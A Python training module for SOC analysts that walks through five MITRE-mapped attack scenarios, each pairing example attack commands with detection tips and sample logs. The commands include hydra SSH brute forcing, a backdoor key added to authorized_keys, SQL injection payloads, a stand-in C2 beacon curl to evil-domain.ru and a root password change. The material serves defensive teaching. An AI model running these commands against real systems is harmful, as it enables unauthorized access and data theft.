"""Attack Simulation Training module — interactive scenarios for SOC analyst training.

Provides guided attack simulations with step-by-step explanations.
"""
import random
from dataclasses import dataclass
from typing import Optional


@dataclass
class AttackScenario:
    """A single attack simulation scenario."""
    id: str
    name: str
    description: str
    mitre_tactic: str
    mitre_technique: str
    mitre_tid: str
    difficulty: str  # beginner, intermediate, advanced
    steps: list[dict]
    learning_objectives: list[str]
    detection_tips: list[str]


SCENARIOS: list[AttackScenario] = [
    AttackScenario(
        id="ssh_bruteforce",
        name="SSH Brute Force Attack",
        description="An attacker attempts to gain unauthorized access by guessing SSH passwords using a dictionary attack.",
        mitre_tactic="Credential Access",
        mitre_technique="Brute Force",
        mitre_tid="T1110",
        difficulty="beginner",
        steps=[
            {
                "phase": "Reconnaissance",
                "action": "Attacker scans for open SSH ports (22)",
                "command": "nmap -sV -p 22 target_ip",
                "what_to_look": "Port 22 open, SSH version banner",
                "sigma_detection": "Port scan detection (SCAN-001)",
            },
            {
                "phase": "Weaponization",
                "action": "Attacker prepares password dictionary file",
                "command": "hydra -l root -P wordlist.txt ssh://target_ip",
                "what_to_look": "Large number of login attempts from single IP",
                "sigma_detection": "SSH brute force (BRUTE-002)",
            },
            {
                "phase": "Delivery",
                "action": "Dictionary attack begins with password list",
                "command": "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://target_ip -t 4",
                "what_to_look": "Multiple failed authentication events in /var/log/auth.log",
                "sigma_detection": "Failed login monitoring",
            },
            {
                "phase": "Exploitation",
                "action": "If successful, attacker gains shell access",
                "command": "ssh root@target_ip",
                "what_to_look": "Successful login from suspicious IP",
                "sigma_detection": "Unusual login source detection",
            },
            {
                "phase": "Installation",
                "action": "Attacker installs backdoor for persistence",
                "command": "echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys",
                "what_to_look": "New SSH keys added to authorized_keys",
                "sigma_detection": "FIM on authorized_keys file",
            },
        ],
        learning_objectives=[
            "Understand how brute force attacks work",
            "Identify brute force patterns in logs",
            "Implement account lockout policies",
            "Configure fail2ban for automatic blocking",
        ],
        detection_tips=[
            "Monitor /var/log/auth.log for repeated failures",
            "Set up alerts for >5 failed logins in 5 minutes",
            "Use fail2ban to auto-block attacking IPs",
            "Implement MFA to prevent password-only attacks",
        ],
    ),
    AttackScenario(
        id="ransomware",
        name="Ransomware Encryption Attack",
        description="Ransomware encrypts files on the system and demands payment for decryption.",
        mitre_tactic="Impact",
        mitre_technique="Data Encrypted for Impact",
        mitre_tid="T1486",
        difficulty="intermediate",
        steps=[
            {
                "phase": "Initial Access",
                "action": "User opens malicious email attachment",
                "command": "phishing_email_with_macro.docm",
                "what_to_look": "Macro execution in Office applications",
                "sigma_detection": "Suspicious Office macro execution",
            },
            {
                "phase": "Execution",
                "action": "Malicious payload executes PowerShell",
                "command": "powershell -enc <base64_payload>",
                "what_to_look": "Encoded PowerShell commands",
                "sigma_detection": "Suspicious PowerShell (PS-001)",
            },
            {
                "phase": "Discovery",
                "action": "Ransomware enumerates files to encrypt",
                "command": "Get-ChildItem -Recurse -File",
                "what_to_look": "Mass file enumeration activity",
                "sigma_detection": "File system reconnaissance",
            },
            {
                "phase": "Impact",
                "action": "Files are encrypted with .locked extension",
                "command": "encrypt_files.ps1",
                "what_to_look": "Bulk file modifications, new .locked extensions",
                "sigma_detection": "Ransomware behavior (RAN-001)",
            },
            {
                "phase": "Extortion",
                "action": "Ransom note displayed to user",
                "command": "README_UNLOCK.txt",
                "what_to_look": "Ransom note files, desktop wallpaper change",
                "sigma_detection": "FIM on system files",
            },
        ],
        learning_objectives=[
            "Recognize ransomware infection vectors",
            "Identify encryption behavior in file system",
            "Implement backup strategies (3-2-1 rule)",
            "Develop incident response for ransomware",
        ],
        detection_tips=[
            "Monitor for bulk file modifications",
            "Alert on new suspicious file extensions",
            "Enable Volume Shadow Copy for recovery",
            "Use application whitelisting to prevent execution",
        ],
    ),
    AttackScenario(
        id="c2_beaconing",
        name="C2 Beaconing Attack",
        description="Malware establishes command and control communication with attacker's server.",
        mitre_tactic="Command and Control",
        mitre_technique="Application Layer Protocol: Web Protocols",
        mitre_tid="T1071.001",
        difficulty="advanced",
        steps=[
            {
                "phase": "Initial Compromise",
                "action": "Malware delivered via drive-by download",
                "command": "exploit_kit_payload.exe",
                "what_to_look": "Suspicious executable download from compromised site",
                "sigma_detection": "Suspicious download detection",
            },
            {
                "phase": "Installation",
                "action": "Malware establishes persistence",
                "command": "schtasks /create /tn ' updater' /tr malware.exe",
                "what_to_look": "New scheduled tasks, registry modifications",
                "sigma_detection": "Persistence mechanism detection",
            },
            {
                "phase": "C2 Communication",
                "action": "Malware beacons to C2 server over HTTPS",
                "command": "curl -s https://evil-domain.ru/beacon",
                "what_to_look": "Regular HTTPS connections to suspicious domains",
                "sigma_detection": "C2 beaconing (CMD-014)",
            },
            {
                "phase": "Data Exfiltration",
                "action": "Sensitive data sent to C2 server",
                "command": "upload_stolen_data.zip",
                "what_to_look": "Large outbound data transfers",
                "sigma_detection": "Data exfiltration detection",
            },
            {
                "phase": "Lateral Movement",
                "action": "Attacker moves to other systems",
                "command": "psexec \\\\target_cmd.exe",
                "what_to_look": "Unusual SMB/RDP connections between hosts",
                "sigma_detection": "Lateral movement detection",
            },
        ],
        learning_objectives=[
            "Identify C2 communication patterns",
            "Analyze network traffic for beaconing",
            "Understand command and control protocols",
            "Implement network segmentation",
        ],
        detection_tips=[
            "Look for regular periodic connections (beaconing)",
            "Monitor DNS queries for suspicious domains",
            "Alert on connections to known malicious IPs",
            "Implement TLS inspection for outbound traffic",
        ],
    ),
    AttackScenario(
        id="sql_injection",
        name="SQL Injection Attack",
        description="Attacker exploits vulnerable web application to inject malicious SQL queries.",
        mitre_tactic="Initial Access",
        mitre_technique="Exploit Public-Facing Application",
        mitre_tid="T1190",
        difficulty="intermediate",
        steps=[
            {
                "phase": "Reconnaissance",
                "action": "Attacker identifies vulnerable input fields",
                "command": "sqlmap -u 'http://target/page?id=1' --dbs",
                "what_to_look": "Automated scanning patterns in web logs",
                "sigma_detection": "Web attack detection (WEB-002)",
            },
            {
                "phase": "Testing",
                "action": "Test for SQL injection vulnerability",
                "command": "' OR '1'='1",
                "what_to_look": "SQL syntax in user input, unexpected query results",
                "sigma_detection": "Input validation failure",
            },
            {
                "phase": "Exploitation",
                "action": "Extract database contents",
                "command": "' UNION SELECT username,password FROM users--",
                "what_to_look": "UNION-based injection patterns",
                "sigma_detection": "SQL injection attempt (WEB-002)",
            },
            {
                "phase": "Data Exfiltration",
                "action": "Download sensitive data",
                "command": "' INTO OUTFILE '/tmp/data.csv'--",
                "what_to_look": "File write operations via SQL",
                "sigma_detection": "Database export detection",
            },
            {
                "phase": "Persistence",
                "action": "Create backdoor user account",
                "command": "INSERT INTO users VALUES('hacker','pass123')",
                "what_to_look": "New user account creation",
                "sigma_detection": "Account creation monitoring",
            },
        ],
        learning_objectives=[
            "Understand SQL injection vulnerability types",
            "Implement parameterized queries",
            "Deploy WAF rules for protection",
            "Secure database permissions",
        ],
        detection_tips=[
            "Monitor web application logs for SQL syntax",
            "Alert on UNION SELECT patterns",
            "Use WAF to block injection attempts",
            "Validate all user input server-side",
        ],
    ),
    AttackScenario(
        id="privilege_escalation",
        name="Privilege Escalation Attack",
        description="Attacker exploits misconfigurations to gain root/admin access.",
        mitre_tactic="Privilege Escalation",
        mitre_technique="Exploitation for Privilege Escalation",
        mitre_tid="T1068",
        difficulty="advanced",
        steps=[
            {
                "phase": "Initial Access",
                "action": "Attacker gains low-privilege shell",
                "command": "ssh user@target",
                "what_to_look": "Normal user login from unusual location",
                "sigma_detection": "Unusual login detection",
            },
            {
                "phase": "Enumeration",
                "action": "Search for misconfigurations",
                "command": "find / -perm -4000 2>/dev/null",
                "what_to_look": "SUID binary enumeration",
                "sigma_detection": "System enumeration activity",
            },
            {
                "phase": "Exploitation",
                "action": "Abuse SUID binary or sudo misconfiguration",
                "command": "sudo -l / suid_binary",
                "what_to_look": "Sudo command execution, SUID binary abuse",
                "sigma_detection": "Sudo misuse (PRIV-001)",
            },
            {
                "phase": "Escalation",
                "action": "Gain root access",
                "command": "root_shell",
                "what_to_look": "UID change to 0, root shell execution",
                "sigma_detection": "Root access detection",
            },
            {
                "phase": "Persistence",
                "action": "Maintain root access",
                "command": "echo 'root:password' | chpasswd",
                "what_to_look": "Root password change, new sudoers entries",
                "sigma_detection": "Configuration change monitoring",
            },
        ],
        learning_objectives=[
            "Identify common privilege escalation vectors",
            "Audit system configurations for weaknesses",
            "Implement least privilege principle",
            "Monitor for privilege escalation attempts",
        ],
        detection_tips=[
            "Audit SUID binaries regularly",
            "Monitor sudo usage logs",
            "Alert on UID/GID changes",
            "Implement sudo command whitelisting",
        ],
    ),
]


class AttackSimulator:
    """Manages attack simulation training scenarios."""

    def __init__(self):
        self.scenarios = {s.id: s for s in SCENARIOS}
        self.active_scenario: Optional[str] = None
        self.current_step: int = 0
        self.completed_steps: list[str] = []

    def get_scenario_list(self) -> list[dict]:
        """Get list of all available scenarios."""
        return [
            {
                "id": s.id,
                "name": s.name,
                "description": s.description,
                "difficulty": s.difficulty,
                "mitre_tid": s.mitre_tid,
                "total_steps": len(s.steps),
            }
            for s in self.scenarios.values()
        ]

    def start_scenario(self, scenario_id: str) -> dict:
        """Start a new attack simulation scenario."""
        if scenario_id not in self.scenarios:
            return {"error": "Scenario not found"}

        scenario = self.scenarios[scenario_id]
        # If same scenario already active, return current step (don't reset on page refresh)
        if self.active_scenario == scenario_id:
            return {
                "scenario": {
                    "id": scenario.id,
                    "name": scenario.name,
                    "description": scenario.description,
                    "difficulty": scenario.difficulty,
                    "mitre_tactic": scenario.mitre_tactic,
                    "mitre_technique": scenario.mitre_technique,
                    "mitre_tid": scenario.mitre_tid,
                },
                "learning_objectives": scenario.learning_objectives,
                "current_step": self._get_step_info(scenario, self.current_step),
                "total_steps": len(scenario.steps),
            }

        self.active_scenario = scenario_id
        self.current_step = 0
        self.completed_steps = []

        return {
            "scenario": {
                "id": scenario.id,
                "name": scenario.name,
                "description": scenario.description,
                "difficulty": scenario.difficulty,
                "mitre_tactic": scenario.mitre_tactic,
                "mitre_technique": scenario.mitre_technique,
                "mitre_tid": scenario.mitre_tid,
            },
            "learning_objectives": scenario.learning_objectives,
            "current_step": self._get_step_info(scenario, 0),
            "total_steps": len(scenario.steps),
        }

    def advance_step(self) -> dict:
        """Advance to the next step in the scenario."""
        if not self.active_scenario:
            return {"error": "No active scenario"}

        scenario = self.scenarios[self.active_scenario]
        self.completed_steps.append(str(self.current_step))
        self.current_step += 1

        if self.current_step >= len(scenario.steps):
            return {
                "completed": True,
                "message": "Scenario completed!",
                "detection_tips": scenario.detection_tips,
                "total_steps": len(scenario.steps),
            }

        return {
            "completed": False,
            "current_step": self._get_step_info(scenario, self.current_step),
            "total_steps": len(scenario.steps),
            "progress": f"{self.current_step}/{len(scenario.steps)}",
        }

    def _get_step_info(self, scenario: AttackScenario, step_idx: int) -> dict:
        """Get detailed information about a specific step."""
        step = scenario.steps[step_idx]
        return {
            "phase": step["phase"],
            "action": step["action"],
            "command": step["command"],
            "what_to_look": step["what_to_look"],
            "sigma_detection": step["sigma_detection"],
            "step_number": step_idx + 1,
        }

    def get_detection_exercise(self, scenario_id: str) -> dict:
        """Get a detection exercise for the scenario."""
        if scenario_id not in self.scenarios:
            return {"error": "Scenario not found"}

        scenario = self.scenarios[scenario_id]

        # Generate a sample log for detection exercise
        sample_logs = {
            "ssh_bruteforce": [
                "Aug 18 11:44:38 sshd[25518]: Failed password for root from 185.130.5.77 port 39920 ssh2",
                "Aug 18 11:44:40 sshd[25518]: Failed password for root from 185.130.5.77 port 39922 ssh2",
                "Aug 18 11:44:42 sshd[25530]: Failed password for admin from 185.130.5.77 port 39924 ssh2",
            ],
            "ransomware": [
                'Sysmon Event 11: TargetFilename: C:\\Users\\Public\\Documents\\report.pdf.locked',
                'Sysmon Event 11: TargetFilename: C:\\Users\\Public\\Documents\\backup.doc.encrypted',
                'Sysmon Event 11: TargetFilename: C:\\Users\\Public\\Pictures\\photo.jpg.crypto',
            ],
            "c2_beaconing": [
                "2026-08-18 11:30:15 ALLOW TCP 10.0.1.15:49321 -> 185.130.5.77:443",
                "2026-08-18 11:30:45 ALLOW TCP 10.0.1.15:49322 -> 185.130.5.77:443",
                "2026-08-18 11:31:15 ALLOW TCP 10.0.1.15:49323 -> 185.130.5.77:443",
            ],
        }

        return {
            "scenario": scenario.name,
            "sample_logs": sample_logs.get(scenario_id, ["No sample logs available"]),
            "questions": [
                "What type of attack is this?",
                "What MITRE ATT&CK technique is being used?",
                "Which Sigma rule would detect this?",
                "What immediate actions should be taken?",
            ],
        }


_simulator: Optional[AttackSimulator] = None


def get_simulator() -> AttackSimulator:
    global _simulator
    if _simulator is None:
        _simulator = AttackSimulator()
    return _simulator
